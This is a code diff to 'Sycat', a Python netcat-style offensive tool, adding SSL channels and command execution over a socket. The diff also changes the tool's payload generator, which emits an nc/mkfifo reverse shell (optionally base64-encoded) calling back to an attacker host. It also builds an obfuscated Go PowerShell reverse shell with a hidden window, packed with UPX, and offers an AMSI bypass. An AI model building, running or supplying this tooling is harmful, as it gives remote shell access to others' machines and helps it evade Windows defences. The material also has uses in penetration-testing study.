@@ -1,16 +1,19 @@
 #!/usr/bin/env python3
 
 import termios, tty
+import subprocess
 import threading
 import logging
 import argparse
 import select
 import socket
-import sys
-import os
 import base64
 import random
 import string
+import pty
+import ssl
+import sys
+import os
 
 class Server:
     '''
@@ -20,21 +23,43 @@ class Server:
         self.port = port
 
     def listener(self):
+
+        if args.ssl:
+            logging.debug("Sycat: Version 0.4")
+            if args.ssl_key is None or args.ssl_cert is None:
+                print('Sycat: Both --ssl-key and --ssl-cert are required when using SSL/TLS encryption.')
+                sys.exit(1)
+            elif not os.path.exists(args.ssl_key):
+                print("Sycat: SSL key file does not exist:", args.ssl_key)
+                sys.exit(1)
+            elif not os.path.exists(args.ssl_cert):
+                print("Sycat: SSL certificate file does not exist:", args.ssl_cert)
+                sys.exit(1)
+
         sokt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sokt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         try:
-            logging.debug("Sycat: Version 0.3 beta")
-            sokt.bind((self.host, int(self.port)))
+            logging.debug("Sycat: Version 0.4")
+            sokt.bind((self.host, self.port))
             logging.debug(f"Sycat: Listening on {host}:{port}")
             sokt.listen(1)
-        except Exception:
-            print(f"Sycat: Address already in use")
+        except Exception as Err:
+            print(f"Sycat: {Err}")
             sys.exit(1)
 
         conn, addr = sokt.accept()
+
         logging.debug(f"Sycat: Connection from {addr[0]}")
         logging.debug(f"Sycat: Connection from {addr[0]}:{addr[1]}")
+
+        if args.ssl:
+            _ssl = Miscellanous(conn)
+            return _ssl.use_ssl()     
+
+        if args.execute:
+            exec_ = Miscellanous(conn)
+            exec_.execute(args.execute)
 
         return conn
 
@@ -43,18 +68,42 @@ class Server:
         Connect to a server, still detect tty/pty terminal in case we connect to bind shell.
         use thread to receive data faster and receive continously.
         don't have to wait for user input for receiving data.
+        on args.execute we exit the program so the Thread will not screwd up
         '''
 
         #STDIN check
         from_stdin, _, _ = select.select([sys.stdin], [], [], 0)
 
+        if args.ssl:
+            logging.debug("Sycat: Version 0.4")
+            if args.ssl_cert is None:
+                print('Sycat: --ssl-cert are required when connect using SSL/TLS encryption.')
+                sys.exit(1)
+            elif not os.path.exists(args.ssl_cert):
+                print("Sycat: SSL certificate file does not exist:", args.ssl_cert)
+                sys.exit(1)
+
         try:
-            logging.debug("Sycat: Version 0.3 beta")
-            sokt = socket.create_connection((self.host, int(self.port)))
+            logging.debug("Sycat: Version 0.4")
+            sokt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            if args.ssl:
+                sokt = ssl.wrap_socket(
+                    sokt,
+                    keyfile=None,
+                    certfile=None, 
+                    ca_certs=args.ssl_cert,  # Server's certificate for verification
+                    cert_reqs=ssl.CERT_REQUIRED
+                )
+
+            sokt.connect((self.host, self.port))
             logging.debug(f"Sycat: Connected to {self.host}:{self.port}")
 
+            if args.execute:
+                exec_ = Miscellanous(sokt)
+                exec_.execute(args.execute)
+                os._exit(os.EX_OK)
+            
             data = Receiver(sokt)
-
             t = threading.Thread(target=data.recv_data, args=())
             t.start()
 
@@ -65,10 +114,9 @@ class Server:
                 logging.debug(f'Sycat: {len(file_data)} bytes sent.')
                 data.cleaner()
 
-            #Miscellanous feature goes here
             if args.upgrade:
-                pty = Miscellanous(sokt)
-                pty.upgrade_shell()
+                _upgrade = Miscellanous(sokt)
+                _upgrade.upgrade_shell()
 
             while True:
                 #continously check terminal is in raw tty or not
@@ -124,7 +172,6 @@ class Receiver:
                 break
 
             if not data:
-                logging.debug(f'Sycat: EOF reached.')
                 break
 
             sys.stdout.buffer.write(data)
@@ -182,8 +229,35 @@ class Miscellanous:
         command += '\n'
         self.conn.sendall(command.encode())
         logging.debug('Sycat: Load external ps1 script to test the AMSI.')
-        
 
+    def execute(self, cmd):
+        os.dup2(self.conn.fileno(),0)
+        os.dup2(self.conn.fileno(),1)
+        os.dup2(self.conn.fileno(),2)
+        pty.spawn(cmd)
+
+    def use_ssl(self):
+        '''
+        generate pem without passphrase:
+        `openssl req -x509 -newkey rsa:4096 -keyout server-key.pem -out server-cert.pem -days 365 -nodes`
+        '''
+        if os.path.exists(args.ssl_key) == False:
+            print(f'Sycat: File {args.ssl_key} not found.')
+            sys.exit(1)
+        elif os.path.exists(args.ssl_cert) == False:
+            print(f'Sycat: File {args.ssl_cert} not found.')
+            sys.exit(1)
+        try:
+            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            ssl_context.load_cert_chain(certfile=args.ssl_cert, keyfile=args.ssl_key)
+            ssl_sock = ssl_context.wrap_socket(self.conn, server_side=True)
+
+            return ssl_sock
+
+        except Exception as Err:
+            print(f'Sycat: {Err}')
+            sys.exit(1)
+        
 class Generator:
     def __init__(self, host, port, options):
         self.host = host
@@ -191,8 +265,7 @@ class Generator:
         self.options = options
 
     def random_string(self):
-        letters = string.ascii_letters + string.digits
-        
+        letters = string.ascii_letters + string.digits  
         return ''.join(random.choice(letters) for _ in range(5))
 
     def linux_posix(self):
@@ -206,7 +279,7 @@ class Generator:
                 print(payload)
         elif self.options == 'nc':
             _random= self.random_string()
-            payload = f'rm -f /tmp/{_random};mkfifo /tmp/{_random};cat /tmp/{_random}|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/{_random}'
+            payload = f'rm -f /tmp/{_random};mkfifo /tmp/{_random};cat /tmp/{_random}|/bin/sh -i 2>&1|nc {self.host} {self.port} >/tmp/{_random}'
             if args.encode:
                 encoded_payload = base64.b64encode(payload.encode('utf-8'))
                 print(f'Sycat: encoded payload => {encoded_payload.decode()}')
@@ -224,17 +297,11 @@ import  (
 	sYsC4LL "syscall"
 	"time"
 )
-
 func main() {
-
 	for true {
 		conn, err := N3t.Dial("tcp", "%s:%d")
-		if err != nil {
-			//sleep for 30 seconds
-			time.Sleep(30 * time.Second)
-          }
-
-		kOmManDT := O5E.Command("pOwErShElL.ExE")
+		if err != nil { time.Sleep(30 * time.Second) }
+		kOmManDT := O5E.Command("PoWeRsHell.ExE")
 		kOmManDT.SysProcAttr = &sYsC4LL.SysProcAttr{HideWindow: true}
         kOmManDT.Stdin = conn
         kOmManDT.Stdout = conn
@@ -249,7 +316,9 @@ func main() {
         print('Sycat: Compiling binary using golang')
         os.system('GOOS=windows GOARCH=amd64 go build -o payload.exe --ldflags "-H=windowsgui" main.go')
         os.remove('main.go')
-        print('Sycat: payload.exe compiled.')
+        print('Sycat: Compressing file size.')
+        subprocess.call('upx -9 payload.exe', shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+        print(f'Sycat: payload.exe ({(os.path.getsize("payload.exe")/1024)/1024:.2f} MB) compiled.')
 
 class Handler:
     '''
@@ -263,10 +332,11 @@ class Handler:
         if args.upgrade:
             pty = Miscellanous(self.conn)
             pty.upgrade_shell()
+        
         elif args.bypassamsi:
             amsi = Miscellanous(self.conn)
             amsi.amsi_bypass()
-            
+
         #receive data and print to stdout
         data = Receiver(self.conn)
         t = threading.Thread(target=data.recv_data, args=())
@@ -293,14 +363,18 @@ class Handler:
 if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(allow_abbrev=False,description="Sycat is a netcat implementation in python (by: sud0ku)")
-    parser.add_argument("-p", "--port", required=True,help="port number to listen on")
-    parser.add_argument("-host","--hostname",metavar="host",required=False, help="source ip for listening or connect to. default 0.0.0.0",default="0.0.0.0")
-    parser.add_argument("-l","--listen",help="listen mode", action="store_true")
-    parser.add_argument("-v", "--verbose", help="verbose output", action="store_true")
-    parser.add_argument("-tty","--upgrade", help="auto spawn pty shell and configure the terminal size (linux only)", action="store_true")
-    parser.add_argument("-e","--encode", help="encode the reverse shell payload into base64", action="store_true")
-    parser.add_argument("-g","--generate", help="generate payload")
-    parser.add_argument("-amsi","--bypassamsi", help="bypass amsi on windows", action="store_true")
+    parser.add_argument("hostname", nargs='?', default='0.0.0.0', help="Source ip for listening or connect to. (default 0.0.0.0)")
+    parser.add_argument("port", type=int, help="Port number to listen on")
+    parser.add_argument("-amsi","--bypassamsi", help="Bypass amsi on windows", action="store_true")
+    parser.add_argument("-e","--execute", metavar='<command>', help="Execute the given command, not compatible with SSL.")
+    parser.add_argument("-en","--encode", help="Encode the reverse shell payload into base64", action="store_true")
+    parser.add_argument("-g","--generate", metavar="<type>", help="Generate payload, available type (nc, bash, exe)")
+    parser.add_argument("-l","--listen",help="Listen mode", action="store_true")
+    parser.add_argument("--ssl",help="Connect or Listen with SSL", action="store_true")
+    parser.add_argument("--ssl-key",metavar="<key/pem>", help="Specify SSL private key (PEM / KEY) for listening")
+    parser.add_argument("--ssl-cert",metavar="<crt/pem>",help="Specify SSL certificate key (PEM / CRT) for listening")
+    parser.add_argument("-tty","--upgrade", help="Auto spawn pty shell and configure the terminal size (linux only)", action="store_true")
+    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")
 
     args = parser.parse_args()
 
@@ -310,19 +384,19 @@ if __name__ == '__main__':
     if args.verbose:
         logging.root.handlers = []
         logging.basicConfig(level=logging.DEBUG,format="%(message)s",)
-
+        
     if args.generate == 'bash':
         gen = Generator(host, port, args.generate)
         gen.linux_posix()
-        sys.exit(1)
+        sys.exit(0)
     elif args.generate == 'nc':
         gen = Generator(host, port, args.generate)
         gen.linux_posix()
-        sys.exit(1)
+        sys.exit(0)
     elif args.generate == 'exe':
         gen = Generator(host, port, args.generate)
         gen.windows()
-        sys.exit(1)
+        sys.exit(0)
 
     try :
         if args.listen:
@@ -330,6 +404,7 @@ if __name__ == '__main__':
             shell = Handler(client.listener())
             t = threading.Thread(target=shell.run, args=())
             t.start()
+            t.join()
         else:
             Server(host, port).connect()
     except KeyboardInterrupt:
